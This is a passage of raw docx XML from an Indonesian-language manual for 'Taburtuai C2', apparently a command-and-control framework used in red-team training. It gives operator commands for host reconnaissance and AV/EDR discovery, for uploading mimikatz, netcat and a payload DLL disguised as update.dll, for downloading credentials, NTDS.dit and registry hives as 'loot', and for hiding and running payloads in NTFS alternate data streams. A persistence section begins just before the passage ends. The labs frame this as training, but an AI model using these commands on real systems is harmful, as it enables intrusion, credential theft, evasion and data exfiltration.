        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>cmd &lt;id&gt; "net user %USERNAME%"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>cmd &lt;id&gt; "net localgroup administrators"</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Network info</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>cmd &lt;id&gt; "ipconfig /all"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>cmd &lt;id&gt; "netstat -an | findstr LISTENING"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>cmd &lt;id&gt; "arp -a"</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Proses berjalan</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>cmd &lt;id&gt; "tasklist /v"</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Antivirus / security tools</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>cmd &lt;id&gt; "wmic /namespace:\\root\securitycenter2 path antivirusproduct get displayname"</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Environment variables</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>cmd &lt;id&gt; "set" --method powershell</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="120"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="240" w:after="80"/>
        <w:shd w:val="clear" w:color="auto" w:fill="C0392B"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">  LAB 5.1  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">  Basic Situational Awareness</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">Step 1:  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:color w:val="141414"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Eksekusi perintah whoami untuk verifikasi konteks eksekusi.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>cmd &lt;agent-id&gt; "whoami /all"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Kumpulkan informasi sistem dasar.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>cmd &lt;agent-id&gt; "systeminfo"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Periksa jaringan dari perspektif target.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>cmd &lt;agent-id&gt; "ipconfig /all" --wait</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>cmd &lt;agent-id&gt; "netstat -an"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Cek proses yang sedang berjalan untuk mencari AV/EDR.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>cmd &lt;agent-id&gt; "tasklist /v" --wait</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="120"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="360" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="32"/>
        </w:rPr>
        <w:t>BAGIAN 6 — FILE OPERATIONS</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="8" w:space="1" w:color="C0392B"/>
        </w:pBdr>
        <w:spacing w:before="0" w:after="80"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:i w:val="0"/>
          <w:color w:val="141414"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Taburtuai C2 mendukung transfer file bidireksional antara operator dan agent. File di-enkripsi sebelum transfer menggunakan kunci AES yang sama dengan payload C2.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="280" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t>Upload File (Operator → Target)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:i w:val="0"/>
          <w:color w:val="141414"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Upload digunakan untuk mentransfer tools, payload, atau data ke mesin target.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># Upload file ke path tertentu di target</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>files upload &lt;agent-id&gt; /local/path/tool.exe "C:\Temp\tool.exe"</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Upload dan tunggu konfirmasi</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>files upload &lt;agent-id&gt; ./mimikatz.exe "C:\Windows\Temp\mim.exe"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Upload payload ke lokasi yang kurang mencurigakan</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>files upload &lt;agent-id&gt; ./payload.dll "C:\Users\Public\Documents\update.dll"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="120"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="280" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t>Download File (Target → Operator)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:i w:val="0"/>
          <w:color w:val="141414"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Download digunakan untuk mengambil data loot (credentials, dokumen, config) dari target.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># Download file dari target</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>files download &lt;agent-id&gt; "C:\Users\john.doe\Desktop\sensitive.xlsx" ./loot/sensitive.xlsx</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Download NTDS.dit (setelah VSS shadow copy)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>files download &lt;agent-id&gt; "C:\Temp\ntds.dit" ./loot/ntds.dit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Download registry hive</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>files download &lt;agent-id&gt; "C:\Temp\SYSTEM" ./loot/SYSTEM.hiv</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="120"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="280" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t>ADS (Alternate Data Streams)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:i w:val="0"/>
          <w:color w:val="141414"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>NTFS ADS memungkinkan menyembunyikan data di dalam file yang terlihat normal. Teknik ini digunakan untuk menyembunyikan payload atau tools dari pemeriksaan sederhana.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># Tulis payload ke ADS</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>ads write &lt;agent-id&gt; \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  --source ./payload.exe \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  --target "C:\Windows\System32\calc.exe" \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  --stream hidden</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Baca ADS</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>ads read &lt;agent-id&gt; \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  --target "C:\Windows\System32\calc.exe:hidden"</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Eksekusi dari ADS (via wscript/mshta)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>ads exec &lt;agent-id&gt; "C:\legit.txt:payload.js" --wait</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="120"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="240" w:after="80"/>
        <w:shd w:val="clear" w:color="auto" w:fill="C0392B"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">  LAB 6.1  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">  File Transfer &amp; ADS</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">Step 1:  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:color w:val="141414"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Upload tools ke target.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>files upload &lt;agent-id&gt; ./tools/nc.exe "C:\Temp\nc.exe"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Verifikasi upload berhasil.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>cmd &lt;agent-id&gt; "dir C:\Temp"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Buat file dummy dan sembunyikan data di ADS-nya.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>cmd &lt;agent-id&gt; "echo legitimate content &gt; C:\Temp\report.txt" --wait</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="120"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>ads write &lt;agent-id&gt; --source ./payload.exe --target "C:\Temp\report.txt" --stream data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Download file hasil (simulasi exfiltration).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>files download &lt;agent-id&gt; "C:\Temp\report.txt" ./exfil/report.txt --wait</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="120"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="360" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="32"/>
        </w:rPr>
        <w:t>BAGIAN 7 — PERSISTENCE</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="8" w:space="1" w:color="C0392B"/>
        </w:pBdr>
        <w:spacing w:before="0" w:after="80"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:i w:val="0"/>
          <w:color w:val="141414"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Persistence memastikan agent tetap berjalan setelah reboot atau logout pengguna. Setiap metode memiliki trade-off antara stealth, persistence level, dan kemudahan deteksi.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="280" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t>Metode Persistence</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1701"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F1F1F"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>Metode</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F1F1F"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>Level</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F1F1F"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>Trigger</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F1F1F"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>Deteksi</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F1F1F"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>Catatan</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>registry_run</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>User</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>User logon</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Sedang</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
